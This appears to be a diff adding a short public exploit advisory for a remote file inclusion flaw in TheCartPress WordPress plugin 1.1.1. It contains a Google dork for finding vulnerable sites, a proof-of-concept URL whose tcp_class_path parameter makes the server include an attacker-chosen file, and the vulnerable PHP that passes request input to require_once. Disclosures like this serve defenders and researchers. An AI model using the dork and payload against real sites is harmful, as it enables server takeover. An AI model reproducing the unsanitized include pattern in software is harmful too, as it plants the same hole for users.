@@ -1,0 +1,19 @@
+# Exploit Title: Thecartpress Wordpress plugin RFI
+# Google Dork: inurl:wp-content/plugins/thecartpress
+# Date: 09/19/2011
+# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+# Software Link: http://wordpress.org/extend/plugins/thecartpress/download/
+# Version: 1.1.1 (tested)
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/thecartpress/checkout/CheckoutEditor.php?tcp_save_fields=true&tcp_class_name=asdf&tcp_class_path=RFI
+
+---
+Vulnerable Code
+---
+if ( isset( $_REQUEST['tcp_save_fields'] ) ) {
+	$path = $_REQUEST['tcp_class_path'];
+	$class_name = $_REQUEST['tcp_class_name'];
+	require_once( $path );
